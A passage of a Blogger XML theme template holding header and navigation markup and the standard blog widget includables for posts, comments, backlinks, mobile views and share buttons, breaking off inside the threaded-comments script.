          <div expr:style='&quot;background-image: url(\&quot;&quot; + data:sourceUrl + &quot;\&quot;); &quot;                        + &quot;background-position: &quot;                        + data:backgroundPositionStyleStr + &quot;; &quot;                        + data:widthStyleStr                        + &quot;min-height: &quot; + data:height                        + &quot;_height: &quot; + data:height                        + &quot;background-repeat: no-repeat; &quot;' id='header-inner'>
            <div class='titlewrapper' style='background: transparent'>
              <h1 class='title' style='background: transparent; border-width: 0px'>
                <b:include name='title'/>
              </h1>
            </div>
            <b:include name='description'/>
          </div>
        </b:if>
    <b:else/>
      <!--Show the image only-->
      <div id='header-inner'>
        <a expr:href='data:blog.homepageUrl' style='display: block'>
          <img expr:alt='data:title' expr:id='data:widget.instanceId + &quot;_headerimg&quot;' expr:src='data:sourceUrl' style='display: block'/>
        </a>
        <!--Show the description-->
        <b:if cond='data:imagePlacement == &quot;BEFORE_DESCRIPTION&quot;'>
          <b:include name='description'/>
        </b:if>
      </div>
    </b:if>
  <b:else/>
    <!--No header image -->
    <div id='header-inner'>
      <div class='titlewrapper'>
        <h1 class='title'>
          <b:include name='title'/>
        </h1>
      </div>
      <b:include name='description'/>
    </div>
  </b:if>
</b:includable>
    <b:includable id='description'>
  <div class='descriptionwrapper'>
    <p class='description'><span><data:description/></span></p>
  </div>
</b:includable>
    <b:includable id='title'>
    <a expr:href='data:blog.homepageUrl'><data:title/></a>
</b:includable>
  </b:widget>
</b:section>
</div><!-- /header-inner-wrap -->
<div class='clr'/>

<!-- NAVIGATION MENU -->
<div class='main_menu'>
<div>
<ul class='menu'>
<li class='current_page_item'><a href='/'><i class='icon-home'/><span>Home</span></a>
<ul class='sub-menu' style=''>
	<li><a href='/'>FlexSlider</a></li>
	<li><a href='/'>FeaturedList Slider</a></li>
	<li><a href='/'>FeaturedList Horizontal</a></li>
</ul>
</li>
<li><a href='#'><i class='icon-folder-close'/><span>Portfolio</span></a>
<ul class='sub-menu' style='display: none; visibility: visible;'>
	<li><a href='#'>Sortable 4 Columns</a></li>
	<li><a href='#'>Sortable 3 Columns</a></li>
	<li><a href='#'>Sortable 2 Columns</a></li>
	<li><a href='#/'>Standard 4 Columns</a></li>
	<li><a href='#'>Standard 3 Columns</a></li>
	<li><a href='#'>Standard 2 Columns</a></li>
</ul>
</li>
<li><a href='#'><i class='icon-pencil'/><span>Blog</span></a>
<ul class='sub-menu' style='display: none; visibility: visible;left: -20px;'>
	<li><a href='#'>Blog Full Width</a></li>
	<li><a href='#'>Blog Left Sidebar</a></li>
</ul>
</li>
  <li><a href='/p/demo-static-page.html'><i class='icon-copy'/><span>Pages</span></a>
<ul class='sub-menu' style='left: -12px;'>
	<li><a href='/'>About Us</a></li>
	<li><a href='/'>Our Team</a></li>
	<li><a href='/'>Gallery 5 Columns</a></li>
	<li><a href='/'>Gallery 4 Columns</a></li>
	<li><a href='/'>Gallery 3 Columns</a></li>
	<li><a href='#'>Gallery (default)</a></li>
	<li><a href='#'>Forums</a></li>
	<li><a href='#'>Full Width Page</a></li>
	<li><a href='#'>Left Sidebar Page</a></li>
	<li><a href='#'>Archive</a></li>
	<li><a href='#'>Error 404</a></li>
</ul>
</li>

<li><a href='#'><i class='icon-magic'/><span>Features</span></a>
<ul class='sub-menu' style=''>
	<li><a href='/'>Header Styles</a></li>
	<li><a href='/'>Notifications</a></li>
	<li><a href='/'>Buttons</a></li>
	<li><a href='/'>Styled Lists</a></li>
	<li><a href='/'>Accordions</a></li>
	<li><a href='/'>Icons</a></li>
	<li><a href='/'>Columns</a></li>
	<li><a href='/'>Typography</a></li>
</ul>
</li>
<li><a href='#'><i class='icon-envelope-alt'/><span>Contact</span></a></li>
</ul>						</div>
					</div>


</div>
   </div>
          <div class='clr'/>

        <div class='outer-wrapper'>
           <div class='ct-wrapper'>

                      <div class='main-wrapper'>

                    <b:section class='content' id='content' showaddelement='no'>
                      <b:widget id='Blog1' locked='true' title='Blog Posts' type='Blog'>
                        <b:includable id='main' var='top'>
  <b:if cond='data:mobile == &quot;false&quot;'>

    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <data:defaultAdStart/>
      <b:loop values='data:posts' var='post'>
        <b:if cond='data:post.isDateStart'>
          <b:if cond='data:post.isFirstPost == &quot;false&quot;'>
            &lt;/div&gt;&lt;/div&gt;
          </b:if>
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-outer&quot;&gt;
        </b:if>
        <b:if cond='data:post.dateHeader'>
          <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
        </b:if>
        <b:if cond='data:post.isDateStart'>
          &lt;div class=&quot;date-posts&quot;&gt;
        </b:if>
        <div class='post-outer'>
        	<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
        <b:include data='post' name='post'/>
        </b:if>
	<b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:include data='post' name='post'/>
        </b:if>
		<b:if cond='data:blog.pageType == &quot;item&quot;'>
		<div class='ft-ctbox clearfix'>
		<b:include data='post' name='post'/>
        </div>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;item&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        </div>
        <b:if cond='data:post.includeAd'>
          <b:if cond='data:post.isFirstPost'>
            <data:defaultAdEnd/>
          <b:else/>
            <data:adEnd/>
          </b:if>
          <div class='inline-ad'>
            <data:adCode/>
          </div>
          <data:adStart/>
        </b:if>
      </b:loop>
      <b:if cond='data:numPosts != 0'>
        &lt;/div&gt;&lt;/div&gt;
      </b:if>
      <data:adEnd/>
    </div>

    <!-- navigation -->
    <b:include name='nextprev'/>


    <b:if cond='data:top.showStars'>
      <script src='//www.google.com/jsapi' type='text/javascript'/>
      <script type='text/javascript'>
        google.load(&quot;annotations&quot;, &quot;1&quot;, {&quot;locale&quot;: &quot;<data:top.languageCode/>&quot;});
        function initialize() {
          google.annotations.setApplicationId(<data:top.blogspotReviews/>);
          google.annotations.createAll();
          google.annotations.fetch();
        }
        google.setOnLoadCallback(initialize);
      </script>
    </b:if>

  <b:else/>
    <b:include name='mobile-main'/>
  </b:if>

  <b:if cond='data:top.showDummy'>
    <data:top.dummyBootstrap/>
  </b:if>

</b:includable>
                        <b:includable id='backlinkDeleteIcon' var='backlink'>
  <span expr:class='&quot;item-control &quot; + data:backlink.adminClass'>
    <a expr:href='data:backlink.deleteUrl' expr:title='data:top.deleteBacklinkMsg'>
      <img src='//www.blogger.com/img/icon_delete13.gif'/>
    </a>
  </span>
</b:includable>
                        <b:includable id='backlinks' var='post'>
  <a name='links'/><h4><data:post.backlinksLabel/></h4>
  <b:if cond='data:post.numBacklinks != 0'>
    <dl class='comments-block' id='comments-block'>
      <b:loop values='data:post.backlinks' var='backlink'>
        <div class='collapsed-backlink backlink-control'>
          <dt class='comment-title'>
            <span class='backlink-toggle-zippy'>&#160;</span>
            <a expr:href='data:backlink.url' rel='nofollow'><data:backlink.title/></a>
            <b:include data='backlink' name='backlinkDeleteIcon'/>
          </dt>
          <dd class='comment-body collapseable'>
            <data:backlink.snippet/>
          </dd>
          <dd class='comment-footer collapseable'>
            <span class='comment-author'><data:post.authorLabel/> <data:backlink.author/></span>
            <span class='comment-timestamp'><data:post.timestampLabel/> <data:backlink.timestamp/></span>
          </dd>
        </div>
      </b:loop>
    </dl>
  </b:if>
  <p class='comment-footer'>
    <a class='comment-link' expr:href='data:post.createLinkUrl' expr:id='data:widget.instanceId + &quot;_backlinks-create-link&quot;' target='_blank'><data:post.createLinkLabel/></a>
  </p>
</b:includable>
                        <b:includable id='comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <h4 id='comment-post-message'>
        <a expr:id='data:widget.instanceId + &quot;_comment-editor-toggle-link&quot;' href='javascript:void(0)'><data:postCommentMsg/></a></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <h4 id='comment-post-message'><data:postCommentMsg/></h4>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.friendConnectJs/>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
    </script>
  </div>
</b:includable>
                        <b:includable id='commentDeleteIcon' var='comment'>
  <span expr:class='&quot;item-control &quot; + data:comment.adminClass'>
    <b:if cond='data:showCmtPopup'>
      <div class='goog-toggle-button'>
        <div class='goog-inline-block comment-action-icon'/>
      </div>
    <b:else/>
      <a class='comment-delete' expr:href='data:comment.deleteUrl' expr:title='data:top.deleteCommentMsg'>
        <img src='//www.blogger.com/img/icon_delete13.gif'/>
      </a>
    </b:if>
  </span>
</b:includable>
                        <b:includable id='comment_count_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <span class='cmt_count_iframe_holder' expr:data-count='data:post.numComments' expr:data-onclick='data:post.addCommentOnclick' expr:data-post-url='data:post.url' expr:data-url='data:post.canonicalUrl'>
    </span>
  <b:else/>
    <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'>
      <data:post.commentLabelFull/>:
    </a>
  </b:if>
</b:includable>
                        <b:includable id='comment_picker' var='post'>
  <b:if cond='data:post.commentSource == 1'>
    <b:include data='post' name='iframe_comments'/>
  <b:else/>
    <b:if cond='data:post.showThreadedComments'>
      <b:include data='post' name='threaded_comments'/>
    <b:else/>
      <b:include data='post' name='comments'/>
    </b:if>
  </b:if>
</b:includable>
                        <b:includable id='comments' var='post'>
  <div class='comments' id='comments'>
    <a name='comments'/>
    <b:if cond='data:post.allowComments'>
      <h4>
        <b:if cond='data:post.numComments == 1'>
          1 <data:commentLabel/>:
        <b:else/>
          <data:post.numComments/> <data:commentLabelPlural/> for &quot;<data:post.title/>&quot;
        </b:if>
      </h4>
	<div class='inner'>
      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'><data:post.oldestLinkText/></a>
          &#160;
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'><data:post.olderLinkText/></a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'><data:post.newerLinkText/></a>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'><data:post.newestLinkText/></a>
        </span>
      </b:if>

      <div expr:id='data:widget.instanceId + &quot;_comments-block-wrapper&quot;'>
        <dl expr:class='data:post.avatarIndentClass' id='comments-block'>
          <b:loop values='data:post.comments' var='comment'>
            <dt expr:class='&quot;comment-author &quot; + data:comment.authorClass' expr:id='data:comment.anchorName'>
              <b:if cond='data:comment.favicon'>
                <img expr:src='data:comment.favicon' height='16px' style='margin-bottom:-2px;' width='16px'/>
              </b:if>
              <a expr:name='data:comment.anchorName'/>
              <b:if cond='data:blog.enabledCommentProfileImages'>
                <data:comment.authorAvatarImage/>
              </b:if>
              <b:if cond='data:comment.authorUrl'>
                <a expr:href='data:comment.authorUrl' rel='nofollow'><data:comment.author/></a>
              <b:else/>
                <data:comment.author/>
              </b:if>
              <data:commentPostedByMsg/>
            </dt>
            <dd class='comment-body' expr:id='data:widget.instanceId + data:comment.cmtBodyIdPostfix'>
              <b:if cond='data:comment.isDeleted'>
                <span class='deleted-comment'><data:comment.body/></span>
              <b:else/>
                <p>
                  <data:comment.body/>
                </p>
              </b:if>
            </dd>
            <dd class='comment-footer'>
              <span class='comment-timestamp'>
                <a expr:href='data:comment.url' title='comment permalink'>
                  <data:comment.timestamp/>
                </a>
                <b:include data='comment' name='commentDeleteIcon'/>
              </span>
            </dd>
          </b:loop>
        </dl>
      </div>

      <b:if cond='data:post.commentPagingRequired'>
        <span class='paging-control-container'>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.oldestLinkUrl'>
            <data:post.oldestLinkText/>
          </a>
          <a expr:class='data:post.oldLinkClass' expr:href='data:post.olderLinkUrl'>
            <data:post.olderLinkText/>
          </a>
          &#160;
          <data:post.commentRangeText/>
          &#160;
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newerLinkUrl'>
            <data:post.newerLinkText/>
          </a>
          <a expr:class='data:post.newLinkClass' expr:href='data:post.newestLinkUrl'>
            <data:post.newestLinkText/>
          </a>
        </span>
      </b:if>

      <p class='comment-footer'>
        <b:if cond='data:post.embedCommentForm'>
          <b:if cond='data:post.allowNewComments'>
            <b:include data='post' name='comment-form'/>
          <b:else/>
            <data:post.noNewCommentsText/>
          </b:if>
        <b:else/>
          <b:if cond='data:post.allowComments'>
            <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
          </b:if>
        </b:if>

      </p>
      </div>
    </b:if>
    <b:if cond='data:showCmtPopup'>
      <div id='comment-popup'>
        <iframe allowtransparency='true' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
        </iframe>
      </div>
    </b:if>

    <div id='backlinks-container'>
    <div expr:id='data:widget.instanceId + &quot;_backlinks-container&quot;'>
       <b:if cond='data:post.showBacklinks'>
         <b:include data='post' name='backlinks'/>
       </b:if>
    </div>
    </div>
    
  </div>
</b:includable>
                        <b:includable id='feedLinks'>
  <b:if cond='data:blog.pageType != &quot;item&quot;'> <!-- Blog feed links -->
    <b:if cond='data:feedLinks'>
      <div class='blog-feeds'>
        <b:include data='feedLinks' name='feedLinksBody'/>
      </div>
    </b:if>

    <b:else/> <!--Post feed links -->
    <div class='post-feeds'>
      <b:loop values='data:posts' var='post'>
        <b:if cond='data:post.allowComments'>
          <b:if cond='data:post.feedLinks'>
            <b:include data='post.feedLinks' name='feedLinksBody'/>
          </b:if>
        </b:if>
      </b:loop>
    </div>
  </b:if>
</b:includable>
                        <b:includable id='feedLinksBody' var='links'>
  <div class='feed-links'>
  <data:feedLinksMsg/>
  <b:loop values='data:links' var='f'>
     <a class='feed-link' expr:href='data:f.url' expr:type='data:f.mimeType' target='_blank'><data:f.name/> (<data:f.feedType/>)</a>
  </b:loop>
  </div>
</b:includable>
                        <b:includable id='iframe_comments' var='post'>

  <b:if cond='data:post.allowIframeComments'>
    <script expr:src='data:post.iframeCommentSrc' type='text/javascript'/>
    <div class='cmt_iframe_holder' expr:data-href='data:post.canonicalUrl' expr:data-viewtype='data:post.viewType'/>

    <b:if cond='data:post.embedCommentForm == &quot;false&quot;'>
      <a expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><data:postCommentMsg/></a>
    </b:if>
  </b:if>
</b:includable>
                        <b:includable id='mobile-index-post' var='post'>
  <div class='mobile-date-outer date-outer'>
    <b:if cond='data:post.dateHeader'>
      <div class='date-header'>
        <span><data:post.dateHeader/></span>
      </div>
    </b:if>

    <div class='mobile-post-outer'>
      <a expr:href='data:post.url'>
        <h3 class='mobile-index-title entry-title' itemprop='name'>
          <data:post.title/>
        </h3>

        <div class='mobile-index-arrow'>&amp;rsaquo;</div>

        <div class='mobile-index-contents'>
          <b:if cond='data:post.thumbnailUrl'>
            <div class='mobile-index-thumbnail'>
              <div class='Image'>
                <img expr:src='data:post.thumbnailUrl'/>
              </div>
            </div>
          </b:if>

          <div class='post-body'>
            <b:if cond='data:post.snippet'><data:post.snippet/></b:if>
          </div>
        </div>

        <div style='clear: both;'/>
      </a>

      <div class='mobile-index-comment'>
        <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
          <b:if cond='data:post.allowComments'>
            <b:if cond='data:post.numComments != 0'>
              <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><b:if cond='data:post.numComments == 1'>1 <data:top.commentLabel/><b:else/><data:post.numComments/> <data:top.commentLabelPlural/></b:if></a>
            </b:if>
          </b:if>
        </b:if>
      </div>
    </div>
  </div>
</b:includable>
                        <b:includable id='mobile-main' var='top'>
    <!-- posts -->
    <div class='blog-posts hfeed'>

      <b:include data='top' name='status-message'/>

      <b:if cond='data:blog.pageType == &quot;index&quot;'>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-index-post'/>
        </b:loop>
      <b:else/>
        <b:loop values='data:posts' var='post'>
          <b:include data='post' name='mobile-post'/>
        </b:loop>
      </b:if>
    </div>

   <b:include name='mobile-nextprev'/>
</b:includable>
                        <b:includable id='mobile-nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <div class='mobile-link-button' id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'>&amp;lsaquo;</a>
      </div>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <div class='mobile-link-button' id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'>&amp;rsaquo;</a>
      </div>
    </b:if>

    <div class='mobile-link-button' id='blog-pager-home-link'>
    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>
    </div>

    <div class='mobile-desktop-link'>
      <a class='home-link' expr:href='data:desktopLinkUrl'><data:desktopLinkMsg/></a>
    </div>

  </div>
  <div class='clear'/>
</b:includable>
                        <b:includable id='mobile-post' var='post'>
  <div class='date-outer'>
    <b:if cond='data:post.dateHeader'>
      <h2 class='date-header'><span><data:post.dateHeader/></span></h2>
    </b:if>
    <div class='date-posts'>
      <div class='post-outer'>

        <div class='post hentry uncustomized-post-template'>
          <a expr:name='data:post.id'/>
          <b:if cond='data:post.title'>
            <h1 class='post-title entry-title'>
              <b:if cond='data:post.link'>
                <a expr:href='data:post.link'><data:post.title/></a>
              <b:else/>
                <b:if cond='data:post.url'>
                  <b:if cond='data:blog.url != data:post.url'>
                    <a expr:href='data:post.url'><data:post.title/></a>
                  <b:else/>
                    <data:post.title/>
                  </b:if>
                <b:else/>
                  <data:post.title/>
                </b:if>
              </b:if>
            </h1>
          </b:if>

          <div class='post-header'>
            <div class='post-header-line-1'/>
          </div>

          <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id'>
            <data:post.body/>
            <div style='clear: both;'/> <!-- clear for photos floats -->
          </div>

          <div class='post-footer'>
            <div class='post-footer-line post-footer-line-1'>
              <span class='post-author vcard'>
                <b:if cond='data:top.showAuthor'>
                  <b:if cond='data:post.authorProfileUrl'>
                    <span class='fn'>
                      <a expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
                        <data:post.author/>
                      </a>
                    </span>
                  <b:else/>
                    <span class='fn'><data:post.author/></span>
                  </b:if>
                </b:if>
              </span>

              <span class='post-timestamp'>
                <b:if cond='data:top.showTimestamp'>
                  <data:top.timestampLabel/>
                  <b:if cond='data:post.url'>
                    <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601'><data:post.timestamp/></abbr></a>
                  </b:if>
                </b:if>
              </span>

              <span class='post-comment-link'>
                <b:if cond='data:blog.pageType != &quot;item&quot;'>
                  <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
                    <b:if cond='data:post.allowComments'>
                      <a class='comment-link' expr:href='data:post.addCommentUrl' expr:onclick='data:post.addCommentOnclick'><b:if cond='data:post.numComments == 1'>1 <data:top.commentLabel/><b:else/><data:post.numComments/> <data:top.commentLabelPlural/></b:if></a>
                    </b:if>
                  </b:if>
                </b:if>
              </span>
            </div>

            <div class='post-footer-line post-footer-line-2'>
              <b:if cond='data:top.showMobileShare'>
                <div class='mobile-link-button goog-inline-block' id='mobile-share-button'>
                  <a href='javascript:void(0);'><data:shareMsg/></a>
                </div>
              </b:if>
              <b:if cond='data:top.showDummy'>
                <div class='goog-inline-block dummy-container'><data:post.dummyTag/></div>
              </b:if>
            </div>

          </div>
        </div>
        <b:if cond='data:blog.pageType == &quot;static_page&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
        <b:if cond='data:blog.pageType == &quot;item&quot;'>
          <b:include data='post' name='comment_picker'/>
        </b:if>
      </div>
    </div>
  </div>
</b:includable>
                        <b:includable id='nextprev'>
  <div class='blog-pager' id='blog-pager'>
    <b:if cond='data:newerPageUrl'>
      <span id='blog-pager-newer-link'>
      <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:newerPageTitle'><data:newerPageTitle/></a>
      </span>
    </b:if>

    <b:if cond='data:olderPageUrl'>
      <span id='blog-pager-older-link'>
      <a class='blog-pager-older-link' expr:href='data:olderPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-older-link&quot;' expr:title='data:olderPageTitle'><data:olderPageTitle/></a>
      </span>
    </b:if>

    <a class='home-link' expr:href='data:blog.homepageUrl'><data:homeMsg/></a>

    <b:if cond='data:mobileLinkUrl'>
      <div class='blog-mobile-link'>
        <a expr:href='data:mobileLinkUrl'><data:mobileLinkMsg/></a>
      </div>
    </b:if>

  </div>
  <div class='clear'/>
</b:includable>
                        <b:includable id='post' var='post'>
  <div class='post hentry'>


<b:if cond='data:blog.pageType == &quot;item&quot;'>
<b:if cond='data:post.title'>
<h1 class='post-title entry-title'>
<b:if cond='data:post.link'>       
<a expr:href='data:post.link'><data:post.title/></a>    
<b:else/>
<b:if cond='data:post.url'>
<b:if cond='data:blog.url != data:post.url'>
<a expr:href='data:post.url'><data:post.title/></a>
<b:else/>
<data:post.title/>
</b:if>
<b:else/>
<data:post.title/>
</b:if>
</b:if>
</h1>
</b:if>
</b:if>

<div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<data:post.body/>

<div class='tags'>
  <b>Filed Under</b> : <b:if cond='data:post.labels'>
<b:loop values='data:post.labels' var='label'>
<a expr:href='data:label.url' rel='tag'>#<data:label.name/></a><b:if cond='data:label.isLast != &quot;true&quot;'/>
</b:loop>
</b:if>
</div>
<b:else/>
<b:if cond='data:blog.pageType == &quot;static_page&quot;'>
<!-- title -->
<h2 class='heading'><data:post.title/></h2>

<data:post.body/>
<b:else/>
<div class='content-inner clearfix'>
<div expr:id='&quot;p&quot; + data:post.id'>
<data:post.body/>
</div>
<script type='text/javascript'>
var x=&quot;<data:post.url/>&quot;,y=&quot;<data:post.title/>&quot;;readmore(&quot;p<data:post.id/>&quot;);
</script>
</div>
<!-- content inner END -->
</b:if>
</b:if>

<!-- meta info -->
<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
<div class='post-meta'>											
<div class='post-meta-item meta-author' style='border-top: solid 5px #4eaf7a; -webkit-border-radius: 0px 0px 0px 4px;-moz-border-radius: 0px 0px 0px 4px;border-radius: 0px 0px 0px 4px;'>
<i class='icon-pencil'/>
<span>
<a expr:href='data:post.authorProfileUrl' expr:title='&quot; Posts by &quot; + data:post.author' rel='author'><data:post.author/></a>
</span>
</div>
												
<div class='post-meta-item meta-date' style='border-top: solid 5px #e55f3a;'>
<i class='icon-time'/>
<span><a expr:href='data:post.url'><data:post.timestamp/></a></span>
</div>
												
<div class='post-meta-item meta-category' style='border-top: solid 5px #eac85d;'>
<i class='icon-reorder'/>
<span>
<b:if cond='data:post.labels'>
<b:loop values='data:post.labels' var='label'>
<a expr:href='data:label.url' rel='tag'><data:label.name/></a><b:if cond='data:label.isLast != &quot;true&quot;'/>
</b:loop>
</b:if>
</span>
</div>
												
<div class='post-meta-item meta-comments' style='border-top: solid 5px #6998b7;'>
<i class='icon-comment'/>
<span>
<a expr:href='data:post.url + &quot;#comments&quot;'><data:post.numComments/> response</a></span>
</div>
												
<div class='post-meta-item last meta-link' style='border-top: solid 5px #575757; -webkit-border-radius: 0px 0px 4px 0px; -moz-border-radius: 0px 0px 4px 0px; border-radius: 0px 0px 4px 0px; background-color: #575757;'>
<b:if cond='data:blog.pageType == &quot;index&quot;'>
<i class='icon-link'/>
<span>
<a expr:href='data:post.url'>Read More</a>
</span> 
 <b:else/>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
<!-- AddThis Button BEGIN -->
<div class='addthis_toolbox addthis_default_style '>
<a class='addthis_counter addthis_pill_style'/>
</div>
</b:if>
</b:if>
</div>
</div>
</b:if>
<div style='clear: both;'/> <!-- clear for photos floats -->
</div>

<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<b:if cond='data:blog.pageType == &quot;item&quot;'>
</b:if>
</div>

      <div class='post-footer-line post-footer-line-2'>

 </div>

      <div class='post-footer-line post-footer-line-3'><span class='post-location'>
        <b:if cond='data:top.showLocation'>
          <b:if cond='data:post.location'>
            <data:postLocationLabel/>
            <a expr:href='data:post.location.mapsUrl' target='_blank'><data:post.location.name/></a>
          </b:if>
        </b:if>
      </span> </div>
    </div>
  </div>
</b:includable>
                        <b:includable id='postQuickEdit' var='post'>
  <b:if cond='data:post.editUrl'>
    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
      <a expr:href='data:post.editUrl' expr:title='data:top.editPostMsg'>
        <img alt='' class='icon-action' height='18' src='http://img2.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
      </a>
    </span>
  </b:if>
</b:includable>
                        <b:includable id='shareButtons' var='post'>
  <b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='data:post.sharePostUrl + &quot;&amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='data:post.sharePostUrl + &quot;&amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='data:post.sharePostUrl + &quot;&amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='data:post.sharePostUrl + &quot;&amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showOrkutButton'><a class='goog-inline-block share-button sb-orkut' expr:href='data:post.sharePostUrl + &quot;&amp;target=orkut&quot;' expr:title='data:top.shareToOrkutMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToOrkutMsg/></span></a></b:if><b:if cond='data:top.showDummy'><div class='goog-inline-block dummy-container'><data:post.dummyTag/></div></b:if>
</b:includable>
                        <b:includable id='status-message'>
  <b:if cond='data:navMessage'>
  <div class='status-msg-wrap'>
    <div class='status-msg-body'>
      <data:navMessage/>
    </div>
    <div class='status-msg-border'>
      <div class='status-msg-bg'>
        <div class='status-msg-hidden'><data:navMessage/></div>
      </div>
    </div>
  </div>
  <div style='clear: both;'/>
  </b:if>
</b:includable>
                        <b:includable id='threaded-comment-form' var='post'>
  <div class='comment-form'>
    <a name='comment-form'/>
    <b:if cond='data:mobile'>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' style='display: none' width='100%'/>
    <b:else/>
      <p><data:blogCommentMessage/></p>
      <data:blogTeamBlogMessage/>
      <a expr:href='data:post.commentFormIframeSrc' id='comment-editor-src'/>
      <iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410' id='comment-editor' name='comment-editor' src='' width='100%'/>
    </b:if>
    <data:post.friendConnectJs/>
    <data:post.cmtfpIframe/>
    <script type='text/javascript'>
      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;, &#39;<data:post.communityId/>&#39;);
    </script>
  </div>
</b:includable>
                        <b:includable id='threaded_comment_css'>
  <style>

  </style>
</b:includable>
                        <b:includable id='threaded_comment_js' var='post'>
  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>

  <script type='text/javascript'>
    (function() {
      var items = <data:post.commentJso/>;
      var msgs = <data:post.commentMsgs/>;
      var config = <data:post.commentConfig/>;

// <![CDATA[
      var cursor = null;
      if (items && items.length > 0) {
        cursor = parseInt(items[items.length - 1].timestamp) + 1;
      }

      var bodyFromEntry = function(entry) {
        if (entry.gd$extendedProperty) {
          for (var k in entry.gd$extendedProperty) {
            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
              return '<span class="deleted-comment">' + entry.content.$t + '</span>';
            }
          }
        }
        return entry.content.$t;
      }

      var parse = function(data) {
        cursor = null;
